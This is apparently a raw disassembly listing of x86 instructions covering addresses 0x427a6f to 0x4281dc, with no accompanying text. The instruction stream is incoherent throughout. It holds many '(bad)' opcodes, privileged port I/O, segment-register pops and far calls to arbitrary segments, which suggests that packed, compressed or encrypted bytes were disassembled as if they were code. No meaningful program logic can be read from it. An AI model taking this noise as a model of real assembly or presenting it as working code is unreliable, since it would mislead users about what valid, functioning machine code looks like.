  427a6f:	les    edi,FWORD PTR [eax+eiz*4-0x27]
  427a73:	sub    DWORD PTR [eax-0x63f4f9ea],eax
  427a79:	pop    ebp
  427a7a:	test   al,0x33
  427a7c:	je     0x427a88
  427a7e:	mov    ecx,0x149d6584
  427a83:	inc    eax
  427a84:	in     al,dx
  427a85:	fst    st(1)
  427a87:	push   cs
  427a88:	out    0x5,eax
  427a8a:	xchg   edx,eax
  427a8b:	aam    0xe8
  427a8d:	xchg   eax,ebx
  427a8f:	push   ebp
  427a90:	out    0x3e,al
  427a92:	xchg   esi,eax
  427a93:	jo     0x427ac1
  427a95:	adc    bl,BYTE PTR [esi]
  427a97:	push   eax
  427a98:	cmp    dl,BYTE PTR [esi+0x3560eb27]
  427a9e:	mov    ecx,0xff1118a9
  427aa3:	loop   0x427b05
  427aa5:	ja     0x427a7b
  427aa7:	mov    ecx,DWORD PTR es:[edx+eiz*8-0x29]
  427aac:	adc    eax,0xa1edc2d9
  427ab1:	ss das 
  427ab3:	add    BYTE PTR [esi],dl
  427ab5:	sub    BYTE PTR ds:0xe11fbdb1,0x5f
  427abc:	addr16 out dx,eax
  427abe:	adc    eax,0xd381c490
  427ac3:	pop    ss
  427ac4:	fwait
  427ac5:	in     eax,0x3b
  427ac7:	cmp    BYTE PTR [esi-0x4c],0xa5
  427acb:	out    dx,eax
  427acc:	and    DWORD PTR [edi],edx
  427ace:	ficomp DWORD PTR [edx]
  427ad0:	adc    al,0x87
  427ad2:	xlat   BYTE PTR ds:[ebx]
  427ad3:	xor    ah,ch
  427ad5:	fild   DWORD PTR [eax+esi*8+0x7bd9d3da]
  427adc:	mov    esp,0xe7d241cc
  427ae1:	xchg   ecx,eax
  427ae2:	jae    0x427ad8
  427ae4:	pop    ss
  427ae5:	cmc    
  427ae6:	fstp   TBYTE PTR [edi]
  427ae8:	aam    0x26
  427aea:	cmp    ah,bh
  427aec:	mov    ebx,0x5c3d4331
  427af1:	lock outs dx,DWORD PTR ds:[esi]
  427af3:	cmp    DWORD PTR [edx],0x3cbb374a
  427af9:	ins    DWORD PTR es:[edi],dx
  427afa:	inc    ebp
  427afb:	push   edi
  427afc:	in     eax,0x9d
  427afe:	ss jbe 0x427b01
  427b01:	add    BYTE PTR [esi-0x3f],ch
  427b04:	imul   edx,ecx,0xffffff94
  427b07:	or     BYTE PTR [ebp-0x48b69be9],al
  427b0d:	in     eax,dx
  427b0e:	out    0x83,eax
  427b10:	call   0xb06f5cfa
  427b15:	pop    ss
  427b16:	or     al,0x9b
  427b18:	pop    esi
  427b19:	jne    0x427b8b
  427b1b:	enter  0x8a4,0x39
  427b1f:	mov    ah,0x28
  427b21:	pop    es
  427b22:	dec    bh
  427b24:	addr16 jle 0x427ae1
  427b27:	addr16 and eax,0xb852fc6a
  427b2d:	pop    ds
  427b2e:	sbb    al,0x8b
  427b30:	add    al,0x9
  427b32:	xlat   BYTE PTR ds:[ebx]
  427b33:	shl    BYTE PTR [ebp+0x43],cl
  427b36:	idiv   esp
  427b38:	jp     0x427b8f
  427b3a:	shl    DWORD PTR [eax+edx*4],0x41
  427b3e:	xor    esi,DWORD PTR [ecx-0x31]
  427b41:	enter  0xf08,0x36
  427b45:	ds ret 0xc021
  427b49:	cmp    edi,DWORD PTR [ebp+0xf21553]
  427b4f:	jae    0x427b5b
  427b51:	mov    ecx,ecx
  427b53:	mov    ds:0xe096a7d2,eax
  427b58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b59:	je     0x427b7c
  427b5b:	xchg   esp,eax
  427b5c:	push   ecx
  427b5d:	imul   ecx,DWORD PTR [esp+ebx*4-0x2522ad6b],0xc7084977
  427b68:	or     BYTE PTR [eax-0x76753bd],ah
  427b6e:	lea    edx,[esi+0xbc76b99]
  427b74:	lahf   
  427b75:	fadd   DWORD PTR [edx-0x7af697d9]
  427b7b:	cmc    
  427b7c:	or     bl,BYTE PTR [ebx]
  427b7e:	mov    dh,0xd1
  427b80:	sahf   
  427b81:	mov    ah,0x95
  427b83:	enter  0x9bc0,0x66
  427b87:	mov    dl,0xec
  427b89:	fild   DWORD PTR [esi-0x47005721]
  427b8f:	rcr    BYTE PTR [ecx+0x28],1
  427b92:	stc    
  427b93:	dec    esi
  427b94:	and    DWORD PTR [ebx-0x63ff0f74],ebp
  427b9a:	push   cs
  427b9b:	je     0x427c1a
  427b9d:	or     al,0xcf
  427b9f:	xor    ebx,edi
  427ba1:	jns    0x427bc1
  427ba3:	in     eax,0x58
  427ba5:	mov    WORD PTR [esi],gs
  427ba7:	das    
  427ba8:	push   cs
  427ba9:	sbb    eax,0x3ca9d6df
  427bae:	pushf  
  427baf:	sub    DWORD PTR [eax],0x9a140c4a
  427bb5:	inc    edi
  427bb6:	inc    edx
  427bb7:	stos   DWORD PTR es:[edi],eax
  427bb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bb9:	pop    ss
  427bba:	test   BYTE PTR [esi],cl
  427bbc:	add    BYTE PTR [ebx-0x2c5be84d],ch
  427bc2:	dec    ebx
  427bc3:	arpl   cx,bp
  427bc5:	xor    eax,0xbf9d697a
  427bca:	iret   
  427bcb:	in     eax,dx
  427bcc:	lock in al,dx
  427bce:	add    DWORD PTR [eax-0x63],esi
  427bd1:	mov    dl,al
  427bd3:	xchg   ebp,eax
  427bd4:	mov    eax,ds:0x3df7bfe9
  427bd9:	cdq    
  427bda:	arpl   WORD PTR [ebx],bp
  427bdc:	jo     0x427b5e
  427bde:	cli    
  427bdf:	rcl    DWORD PTR [edi+eax*2-0xf329bd8],cl
  427be6:	fnstcw WORD PTR [edx]
  427be8:	mov    DWORD PTR [esi],esi
  427bea:	call   FWORD PTR [edi+eiz*8+0x67]
  427bee:	(bad)  
  427bef:	rcr    BYTE PTR [edi],1
  427bf1:	jg     0x427bfc
  427bf3:	dec    si
  427bf5:	repz and DWORD PTR [ebx+0x5dcdd434],esi
  427bfc:	lods   eax,DWORD PTR ds:[esi]
  427bfd:	sahf   
  427bfe:	fsub   DWORD PTR [edi]
  427c00:	and    al,0x6f
  427c02:	sub    al,0x3f
  427c04:	rol    BYTE PTR [ecx],0xc7
  427c07:	mov    ds:0xd91939bc,al
  427c0c:	out    0xa0,al
  427c0e:	ret    
  427c0f:	xchg   esp,eax
  427c10:	stos   DWORD PTR es:[edi],eax
  427c11:	shl    DWORD PTR ds:0x2674a23c,1
  427c17:	hlt    
  427c18:	test   eax,0xfe23aac7
  427c1d:	mov    ecx,0x7fc6f53
  427c22:	sub    esi,edi
  427c24:	test   al,0x91
  427c26:	mov    DWORD PTR [ebx],edi
  427c28:	sar    DWORD PTR [eax-0x7a],cl
  427c2b:	xor    eax,0x28f7001a
  427c30:	push   ebx
  427c31:	int3   
  427c32:	xchg   BYTE PTR [edx],al
  427c34:	ror    DWORD PTR [edx],cl
  427c36:	dec    esp
  427c37:	sbb    cl,BYTE PTR [eax]
  427c39:	xor    esp,ebp
  427c3b:	(bad)  
  427c3c:	jmp    0x109b:0x672f7231
  427c43:	inc    ecx
  427c44:	shl    DWORD PTR [esi-0x7d],cl
  427c47:	(bad)  
  427c48:	sbb    al,al
  427c4a:	sar    DWORD PTR [edi],0x10
  427c4d:	fst    DWORD PTR [esi-0x3b]
  427c50:	xor    al,0x82
  427c52:	(bad)  
  427c53:	jns    0x427c5a
  427c55:	test   eax,0x58835d07
  427c5a:	inc    edx
  427c5b:	add    BYTE PTR [ebx+ebx*1],ch
  427c5e:	fcom   DWORD PTR [esi]
  427c60:	pop    eax
  427c61:	add    al,0xb8
  427c63:	pusha  
  427c64:	xor    eax,ebx
  427c66:	adc    bl,ch
  427c68:	mov    edi,0xcc8a7daf
  427c6d:	pop    ecx
  427c6e:	lds    ecx,FWORD PTR [esp+ebx*1]
  427c71:	(bad)  [edx-0x2d8ddf83]
  427c77:	lea    ebp,[ebp-0x47]
  427c7a:	lods   al,BYTE PTR ds:[esi]
  427c7b:	mov    dh,0x37
  427c7d:	jns    0x427ceb
  427c7f:	rcr    DWORD PTR [edx+ebx*2-0xedf9682],0x74
  427c87:	stos   DWORD PTR es:[edi],eax
  427c88:	adc    al,0x1e
  427c8a:	shr    edx,0xbc
  427c8d:	gs mov ah,0x19
  427c90:	sub    BYTE PTR [ebx],ah
  427c92:	cld    
  427c93:	repnz cmp BYTE PTR [ebp+eiz*8+0x6227712a],bl
  427c9b:	imul   ebx,DWORD PTR [edi+0x6d],0xffffffdd
  427c9f:	xor    BYTE PTR [ecx-0x34],0xdf
  427ca3:	pushf  
  427ca4:	icebp  
  427ca5:	mov    eax,0xec272f5a
  427caa:	add    eax,0xb67857eb
  427caf:	mov    ah,0x71
  427cb1:	mov    ecx,0xdae5ad61
  427cb6:	retf   
  427cb7:	iret   
  427cb8:	out    dx,al
  427cb9:	add    BYTE PTR [eax],al
  427cbb:	add    BYTE PTR [eax+0x3fc326ab],dl
  427cc1:	iret   
  427cc2:	cmc    
  427cc3:	sti    
  427cc4:	pushf  
  427cc5:	ds loop 0x427cb4
  427cc8:	dec    ecx
  427cc9:	mov    ?,WORD PTR [ecx]
  427ccb:	daa    
  427ccc:	sbb    dh,ah
  427cce:	add    DWORD PTR [eax],eax
  427cd0:	test   DWORD PTR [edx],eax
  427cd2:	add    BYTE PTR [eax],al
  427cd4:	fnstsw WORD PTR [eax+0x44]
  427cd7:	sbb    BYTE PTR [ecx+0x494aa495],ch
  427cdd:	push   0xfffffff0
  427cdf:	mov    edi,0x2507bcf9
  427ce4:	mov    esi,DWORD PTR [ebp-0x7fae3439]
  427cea:	test   DWORD PTR [ebx],edi
  427cec:	dec    ebx
  427ced:	inc    ecx
  427cee:	daa    
  427cef:	inc    ebx
  427cf0:	inc    ebx
  427cf1:	sub    cl,BYTE PTR [edx-0x76]
  427cf4:	(bad)  
  427cf6:	sub    eax,0xc86306d7
  427cfb:	cdq    
  427cfc:	push   edx
  427cfd:	pop    ss
  427cfe:	clc    
  427cff:	ficom  DWORD PTR ds:0xf8771033
  427d05:	mov    ebx,DWORD PTR [eax-0x55]
  427d08:	and    eax,0x1442d0a2
  427d0d:	outs   dx,BYTE PTR ds:[esi]
  427d0e:	loop   0x427d14
  427d10:	in     eax,0x8d
  427d12:	mov    ds:0x46ebe844,al
  427d17:	adc    eax,0xcbb91c0a
  427d1c:	xor    al,0x17
  427d1e:	pop    ds
  427d1f:	pop    ebx
  427d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d22:	leave  
  427d23:	pop    ecx
  427d24:	clc    
  427d25:	xacquire xchg DWORD PTR [ecx],ecx
  427d28:	fwait
  427d29:	or     BYTE PTR [edx+0x134f420f],dl
  427d2f:	imul   esi,DWORD PTR [eax+edx*2-0x6681a58f],0x89a1445e
  427d3a:	inc    ecx
  427d3b:	or     eax,0x7af8ba86
  427d40:	lea    eax,[ecx+0x676187f1]
  427d46:	xor    eax,0x313e8ed5
  427d4b:	sub    DWORD PTR [edx],ecx
  427d4d:	lods   eax,DWORD PTR ds:[esi]
  427d4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d4f:	mov    bh,0x2f
  427d51:	aas    
  427d52:	je     0x427d5e
  427d54:	std    
  427d55:	aaa    
  427d56:	sbb    eax,0xcaff576
  427d5b:	mov    ch,0x2f
  427d5d:	pop    edi
  427d5e:	shr    ch,0x4f
  427d61:	push   ebx
  427d62:	mov    cl,0x94
  427d64:	mov    ebx,0xd7f46357
  427d69:	inc    ebx
  427d6a:	mov    ah,0x72
  427d6c:	stos   DWORD PTR es:[edi],eax
  427d6d:	pop    ebp
  427d6e:	push   0xfae0a228
  427d73:	jecxz  0x427d85
  427d75:	out    0x9f,al
  427d77:	ss stc 
  427d79:	imul   ecx,DWORD PTR [eax-0x2b38ce71],0xd0ce241b
  427d83:	ins    BYTE PTR es:[edi],dx
  427d84:	mov    DWORD PTR [ebp+0x27],edi
  427d87:	pushf  
  427d88:	cmp    eax,0x7ee76d69
  427d8d:	scas   eax,DWORD PTR es:[edi]
  427d8e:	test   eax,0x44b1becd
  427d93:	loopne 0x427d2f
  427d95:	test   eax,0x8a4bd3f0
  427d9a:	xor    al,ch
  427d9c:	idiv   DWORD PTR [esp+ecx*8+0xb4bb625]
  427da3:	jbe    0x427e11
  427da5:	push   0xea34d63
  427daa:	cdq    
  427dab:	test   esi,esp
  427dad:	jno    0x427d66
  427daf:	scas   al,BYTE PTR es:[edi]
  427db0:	add    BYTE PTR [ebx-0x64],0xe8
  427db4:	and    edx,0xfa8dae52
  427dba:	ret    
  427dbb:	or     eax,DWORD PTR [edi+edx*2]
  427dbe:	mul    esp
  427dc0:	jbe    0x427e0e
  427dc2:	loop   0x427de3
  427dc4:	out    dx,eax
  427dc5:	xchg   ebp,eax
  427dc6:	mov    cl,0x91
  427dc8:	repnz fcmovnbe st,st(4)
  427dcb:	xchg   ecx,eax
  427dcc:	cdq    
  427dcd:	jne    0x427ddf
  427dcf:	loop   0x427dc2
  427dd1:	cs inc ebx
  427dd3:	aaa    
  427dd4:	arpl   WORD PTR [esp+ebp*8],dx
  427dd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427dd8:	jb     0x427d87
  427dda:	js     0x427e04
  427ddc:	inc    esi
  427ddd:	push   edx
  427dde:	and    eax,0x9383de01
  427de3:	test   DWORD PTR [esi],edi
  427de5:	lods   eax,DWORD PTR ds:[esi]
  427de6:	mov    al,0xf0
  427de8:	cmp    cl,bh
  427dea:	mov    ebp,DWORD PTR [ebx-0x530d76f]
  427df0:	jmp    0x4364bc1e
  427df5:	pusha  
  427df6:	xor    DWORD PTR [ebx+0xe76756f],0xf19335ef
  427e00:	fwait
  427e01:	ins    DWORD PTR es:[edi],dx
  427e02:	or     dh,ah
  427e04:	jno    0x427e17
  427e06:	jno    0x427d91
  427e08:	ss sbb al,0xe1
  427e0b:	xchg   esi,eax
  427e0c:	and    al,0x8f
  427e0e:	(bad)  
  427e0f:	push   edi
  427e10:	mov    ebx,0x3703c246
  427e15:	add    BYTE PTR [esi+0x22c24912],0xc
  427e1c:	xchg   ecx,eax
  427e1d:	test   eax,0x65368127
  427e22:	adc    ecx,DWORD PTR [esi]
  427e24:	pop    edx
  427e25:	push   0x606f8e46
  427e2a:	mov    cl,0x70
  427e2c:	or     al,0x98
  427e2e:	call   0x9113bd60
  427e33:	and    DWORD PTR [edx],edi
  427e35:	lods   al,BYTE PTR ds:[esi]
  427e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427e37:	sub    BYTE PTR [edx],0x2b
  427e3a:	mov    bh,dh
  427e3c:	loopne 0x427ead
  427e3e:	shl    BYTE PTR [ecx],0xfa
  427e41:	and    DWORD PTR [esi],0xfffffff2
  427e44:	mov    dh,0xb4
  427e46:	in     al,0x5d
  427e48:	shl    ecx,0x8a
  427e4b:	push   esi
  427e4c:	enter  0x88f3,0x9b
  427e50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e51:	xchg   edi,eax
  427e52:	fsubr  QWORD PTR [eax+0x5efeda82]
  427e58:	sub    ecx,ebp
  427e5a:	sbb    cl,dh
  427e5c:	mov    al,ds:0xd6081e11
  427e61:	xchg   edi,eax
  427e62:	mov    es,eax
  427e64:	test   eax,0xc011720e
  427e69:	sbb    DWORD PTR [edi],ebp
  427e6b:	mov    ah,0xf8
  427e6d:	xor    DWORD PTR [esi+esi*4-0x24],0x3b3b527e
  427e75:	mov    ah,0xa5
  427e77:	pushf  
  427e78:	inc    edx
  427e79:	pop    eax
  427e7a:	mov    cl,0xc
  427e7c:	inc    esp
  427e7d:	and    bh,0xf6
  427e80:	sub    edi,DWORD PTR [ebp-0x43]
  427e83:	dec    ebp
  427e84:	push   ss
  427e85:	aaa    
  427e86:	cmp    edi,DWORD PTR [edi-0x4b5bf761]
  427e8c:	jge    0x427f09
  427e8e:	sbb    BYTE PTR [eax+0x48],dl
  427e91:	adc    eax,0xf93fa8ab
  427e96:	pop    ecx
  427e97:	mov    WORD PTR ds:0x2b93dcdf,es
  427e9d:	xchg   ebx,eax
  427e9e:	test   al,0xef
  427ea0:	adc    DWORD PTR [eax+ebp*8+0x1c763093],0xecdc3b71
  427eab:	adc    eax,0xc9437911
  427eb0:	add    edi,DWORD PTR [edi]
  427eb2:	adc    eax,DWORD PTR [esi+0xf]
  427eb5:	fwait
  427eb6:	(bad)  
  427eb7:	aam    0x75
  427eb9:	dec    edx
  427eba:	or     DWORD PTR [ecx-0x5f],ebp
  427ebd:	(bad)  
  427ebe:	es fcmovne st,st(0)
  427ec1:	jg     0x427e65
  427ec3:	mov    ebx,0x6157bedd
  427ec8:	inc    eax
  427ec9:	retf   0x99d2
  427ecc:	xor    edx,DWORD PTR [ebx]
  427ece:	sbb    BYTE PTR [esi+eax*1-0x5368c005],dh
  427ed5:	lock aam 0x7d
  427ed8:	(bad)  [ebx]
  427eda:	popa   
  427edb:	into   
  427edc:	sahf   
  427edd:	adc    DWORD PTR [eax+0xf],ecx
  427ee0:	imul   ebp,edx,0xffffffc5
  427ee3:	ret    
  427ee4:	inc    ebp
  427ee5:	lds    ebx,FWORD PTR ds:0x55d9407c
  427eeb:	sbb    eax,0x22454be1
  427ef0:	stos   DWORD PTR es:[edi],eax
  427ef1:	sbb    eax,0x412de8cd
  427ef6:	pop    eax
  427ef7:	popa   
  427ef8:	arpl   WORD PTR [ebp+0x63615531],sp
  427efe:	push   ss
  427eff:	bound  edx,QWORD PTR [edi+0x73]
  427f02:	fs push esi
  427f04:	inc    eax
  427f05:	fsubr  DWORD PTR [ecx-0x2242a904]
  427f0b:	sbb    BYTE PTR [edi+0x61],bl
  427f0e:	xlat   BYTE PTR ds:[ebx]
  427f0f:	in     eax,0x65
  427f11:	jle    0x427ed9
  427f13:	fcmovnu st,st(1)
  427f15:	cdq    
  427f16:	scas   eax,DWORD PTR es:[edi]
  427f17:	aad    0xe8
  427f19:	in     al,dx
  427f1a:	pop    edx
  427f1b:	inc    ecx
  427f1c:	std    
  427f1d:	xor    eax,esi
  427f1f:	popa   
  427f20:	ja     0x427f6e
  427f22:	or     edx,eax
  427f24:	ss pop es
  427f26:	xchg   BYTE PTR [edi],ah
  427f28:	push   ds
  427f29:	scas   eax,DWORD PTR es:[edi]
  427f2a:	ins    BYTE PTR es:[edi],dx
  427f2b:	lock pop ebp
  427f2d:	hlt    
  427f2e:	inc    ebp
  427f2f:	xchg   ebp,eax
  427f30:	dec    edi
  427f31:	call   0x6ca0:0xe3fe27e8
  427f38:	jecxz  0x427fa5
  427f3a:	loope  0x427fb1
  427f3c:	aad    0x75
  427f3e:	aam    0x8f
  427f40:	mov    ds:0x9362edf1,al
  427f45:	dec    ebx
  427f46:	jle    0x427fa2
  427f48:	je     0x427f5f
  427f4a:	cmp    BYTE PTR [ecx],0xd9
  427f4d:	cmp    edi,ebx
  427f4f:	lahf   
  427f50:	xor    ecx,DWORD PTR [ebx-0x1d]
  427f53:	mov    eax,0x21b7cb5e
  427f58:	imul   eax,DWORD PTR [eax],0x39fd0000
  427f5e:	xor    eax,0xfd1cf514
  427f63:	stc    
  427f64:	int    0xea
  427f66:	xor    al,al
  427f68:	out    0xeb,eax
  427f6a:	pop    eax
  427f6b:	rcr    DWORD PTR [edi+0x690001f6],cl
  427f71:	add    al,BYTE PTR [eax]
  427f73:	add    BYTE PTR [esi],bh
  427f75:	or     edi,DWORD PTR [edi+0x68]
  427f78:	retf   0x342c
  427f7b:	ror    BYTE PTR [edi+0x24],0xb9
  427f7f:	int    0xe6
  427f81:	and    eax,ecx
  427f83:	retf   
  427f84:	jb     0x427f7c
  427f86:	adc    cl,BYTE PTR [edi-0x6e7feb40]
  427f8c:	mov    ebx,0x2578b1f5
  427f91:	and    al,0x20
  427f93:	out    dx,eax
  427f94:	sbb    esi,DWORD PTR [esi-0xd]
  427f97:	scas   eax,DWORD PTR es:[edi]
  427f98:	mov    ah,0x8c
  427f9a:	jno    0x427fce
  427f9c:	cmp    dh,BYTE PTR [eax-0x2ec9d237]
  427fa2:	adc    eax,0xbe98f7a8
  427fa7:	sbb    ebp,DWORD PTR [esi]
  427fa9:	mov    dh,0xac
  427fab:	out    dx,eax
  427fac:	les    edx,FWORD PTR [ebp+ebp*1+0x0]
  427fb0:	neg    DWORD PTR [eax-0x21]
  427fb3:	lds    ebp,FWORD PTR ds:0x29effaba
  427fb9:	lds    esp,FWORD PTR [edi]
  427fbb:	or     DWORD PTR [edx-0x5f],ecx
  427fbe:	xor    BYTE PTR [eax+0x16],0x29
  427fc2:	imul   ecx,DWORD PTR [esi+0x20],0x6e
  427fc6:	cdq    
  427fc7:	jp     0x427f5c
  427fc9:	(bad)  
  427fcb:	or     esp,DWORD PTR [esi+0x5d]
  427fce:	adc    DWORD PTR [esi],ebp
  427fd0:	jle    0x427f98
  427fd2:	xchg   DWORD PTR [eax-0x6b],ebp
  427fd5:	pop    edi
  427fd6:	mov    ebp,0x3e727386
  427fdb:	pop    ss
  427fdc:	sbb    ebx,ebx
  427fde:	fs ja  0x427fcb
  427fe1:	mov    ebx,0xfa54b79e
  427fe6:	cmp    ch,BYTE PTR [eax]
  427fe8:	jmp    0x3c6795d5
  427fed:	call   0xd8ba:0xbd02d429
  427ff4:	mov    bh,0x8c
  427ff6:	adc    ebp,DWORD PTR [ebx]
  427ff8:	mov    dl,0xcf
  427ffa:	enter  0x59a8,0x46
  427ffe:	int    0xea
  428000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428001:	adc    DWORD PTR [edi+0xf],edi
  428004:	push   cs
  428005:	cld    
  428006:	(bad)  
  428007:	or     eax,0x6013bab9
  42800c:	push   edx
  42800d:	mov    edx,0xa6a01527
  428012:	lods   eax,DWORD PTR ds:[esi]
  428013:	adc    al,0x10
  428015:	mov    edx,0x2d3f358e
  42801a:	js     0x428068
  42801c:	repz in al,dx
  42801e:	in     eax,0x1d
  428020:	xchg   ecx,eax
  428021:	add    dh,dl
  428023:	jb     0x428012
  428025:	mov    ah,0x6e
  428027:	mov    al,ds:0x1ce1bbd5
  42802c:	and    ebx,DWORD PTR [ebp-0x42]
  42802f:	(bad)  
  428030:	fidivr DWORD PTR [ebx]
  428032:	inc    eax
  428033:	mov    ebp,0xce4c87e3
  428038:	pop    esi
  428039:	stos   BYTE PTR es:[edi],al
  42803a:	rol    BYTE PTR [ebp-0x7dd00fa9],0x14
  428041:	and    DWORD PTR [ecx+eax*1+0x33],ebp
  428045:	mov    es,WORD PTR [edi]
  428047:	pop    eax
  428048:	dec    esp
  428049:	outs   dx,DWORD PTR ds:[esi]
  42804a:	mov    dh,0x5f
  42804c:	repnz dec ebp
  42804e:	and    ch,BYTE PTR [ebx]
  428050:	inc    ebp
  428051:	xchg   BYTE PTR [eax+0x195a8189],dl
  428057:	imul   BYTE PTR ds:0x9bc3efba
  42805d:	ret    0xb08b
  428060:	cdq    
  428061:	pushf  
  428062:	clc    
  428063:	push   ebp
  428064:	xor    cl,BYTE PTR [ebp-0x2a41a8ca]
  42806a:	icebp  
  42806b:	mov    cl,0x5
  42806d:	ret    
  42806e:	xchg   DWORD PTR [eax+0x9],eax
  428071:	cwde   
  428072:	aaa    
  428073:	pop    edx
  428074:	leave  
  428075:	dec    esi
  428076:	je     0x428072
  428078:	mov    edi,DWORD PTR [esi]
  42807a:	cdq    
  42807b:	mov    dl,0xd8
  42807d:	and    BYTE PTR [ebx],bl
  42807f:	in     al,0xde
  428081:	in     eax,dx
  428082:	lods   eax,DWORD PTR ds:[esi]
  428083:	mov    dh,0x13
  428085:	stos   BYTE PTR es:[edi],al
  428086:	jns    0x4280f3
  428088:	mov    eax,ds:0x84c6b5d6
  42808d:	loop   0x428038
  42808f:	mov    ecx,0x763a0240
  428094:	outs   dx,BYTE PTR ds:[esi]
  428095:	ins    BYTE PTR es:[edi],dx
  428096:	push   es
  428097:	sbb    eax,0xf0ebe8b
  42809c:	cmp    dl,0xa8
  42809f:	mov    dh,0xee
  4280a1:	outs   dx,BYTE PTR ds:[esi]
  4280a2:	and    ebp,DWORD PTR [ecx]
  4280a4:	mov    edi,0xcebc92e9
  4280a9:	in     al,0x82
  4280ab:	cmp    al,0x98
  4280ad:	jae    0x428097
  4280af:	(bad)  
  4280b0:	and    al,0x6e
  4280b2:	cwde   
  4280b3:	jmp    0x42809c
  4280b5:	mov    ah,0x23
  4280b7:	(bad)  
  4280b9:	in     al,dx
  4280ba:	int    0xe3
  4280bc:	xor    DWORD PTR [ebx+ebp*2],ebp
  4280bf:	and    al,0x4
  4280c1:	mov    ebx,0xa4605f06
  4280c6:	sbb    cl,cl
  4280c8:	enter  0x3ca5,0x9d
  4280cc:	in     eax,0xec
  4280ce:	stos   BYTE PTR es:[edi],al
  4280cf:	repz and DWORD PTR [ebx],ebp
  4280d2:	jno    0x428071
  4280d4:	stos   DWORD PTR es:[edi],eax
  4280d5:	fwait
  4280d6:	adc    al,0x24
  4280d8:	dec    ecx
  4280d9:	sub    DWORD PTR [edx],0xffffffc9
  4280dc:	in     eax,dx
  4280dd:	mov    bh,0x63
  4280df:	js     0x4280e5
  4280e1:	into   
  4280e2:	cmp    DWORD PTR [esi-0x74],esp
  4280e5:	inc    ebx
  4280e6:	sar    BYTE PTR [ebx],1
  4280e8:	adc    eax,0x4c6ff85c
  4280ed:	push   edi
  4280ee:	jg     0x4280cd
  4280f0:	lock ja 0x428101
  4280f3:	imul   DWORD PTR [eax-0x76]
  4280f6:	xor    bl,dl
  4280f8:	das    
  4280f9:	ret    0x35a0
  4280fc:	jns    0x428100
  4280fe:	push   ecx
  4280ff:	stc    
  428100:	or     cl,BYTE PTR ds:0xe17eb5c0
  428106:	call   0x97ca:0x6f6d8db4
  42810d:	sbb    cl,bh
  42810f:	fidiv  WORD PTR [esi]
  428111:	ja     0x428174
  428113:	jecxz  0x4280d7
  428115:	xchg   esp,esi
  428117:	fdiv   st(0),st
  428119:	inc    edi
  42811a:	aam    0xdd
  42811c:	sbb    BYTE PTR ds:0x318d9bdc,dh
  428122:	in     eax,dx
  428123:	xor    bl,BYTE PTR [esi]
  428125:	call   0xfba8b40e
  42812a:	adc    eax,0x597cf340
  42812f:	out    dx,al
  428130:	(bad)  
  428131:	mov    edx,0xf71ce1e3
  428136:	fbld   TBYTE PTR cs:[eax+ecx*1]
  42813a:	fs and eax,0xde81f01d
  428140:	das    
  428141:	push   ebp
  428142:	sti    
  428143:	iret   
  428144:	sti    
  428145:	(bad)  
  428146:	and    BYTE PTR [esi],ch
  428148:	push   ds
  428149:	fcomp  DWORD PTR [edx+0x2a]
  42814c:	mov    ds:0x3efcc08,eax
  428151:	xor    ah,al
  428153:	mov    dl,0x28
  428155:	mov    bh,0x91
  428157:	sti    
  428158:	jbe    0x4280fa
  42815a:	mov    edi,0xbff8d6b0
  42815f:	add    al,dl
  428161:	leave  
  428162:	mov    eax,0xc6be835c
  428167:	imul   edx,DWORD PTR [edx+eax*4-0x1f833e8f],0x930b1b90
  428172:	cmp    cl,ch
  428174:	mov    dl,0xdf
  428176:	jmp    0xc9bc7a6b
  42817b:	test   al,0xc7
  42817d:	pushf  
  42817e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42817f:	cli    
  428180:	xchg   esp,eax
  428181:	popf   
  428182:	push   0x7d
  428184:	jnp    0x428122
  428186:	les    ebx,FWORD PTR [ecx+0x7ba19426]
  42818c:	or     BYTE PTR [ebx+esi*8-0x66],0xb7
  428191:	in     al,dx
  428192:	popa   
  428193:	add    eax,0x1cbce376
  428198:	cdq    
  428199:	xchg   esi,eax
  42819a:	(bad)  
  42819b:	push   ebx
  42819c:	mov    esp,0x13835925
  4281a1:	mov    dh,BYTE PTR [ecx+eax*1+0x22]
  4281a5:	mov    ecx,0xce6be7e8
  4281aa:	sbb    DWORD PTR [ebp+0x120e0d0a],esp
  4281b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4281b1:	xor    al,0xfd
  4281b3:	sahf   
  4281b4:	cmp    BYTE PTR [edx+ecx*8-0xd119db8],cl
  4281bb:	(bad)  
  4281bc:	push   edi
  4281bd:	mov    edx,0xf61a1d0d
  4281c2:	rcl    DWORD PTR [ebp+0x57cef1fe],1
  4281c8:	sahf   
  4281c9:	or     DWORD PTR [esi+0x7151a926],esi
  4281cf:	jnp    0x428236
  4281d1:	dec    edi
  4281d2:	push   eax
  4281d3:	pop    ss
  4281d4:	je     0x428203
  4281d6:	mov    ah,bl
  4281d8:	(bad)  
  4281d9:	fcom   QWORD PTR [eax]
  4281db:	out    dx,eax
  4281dc:	or     BYTE PTR [eax],al
	...
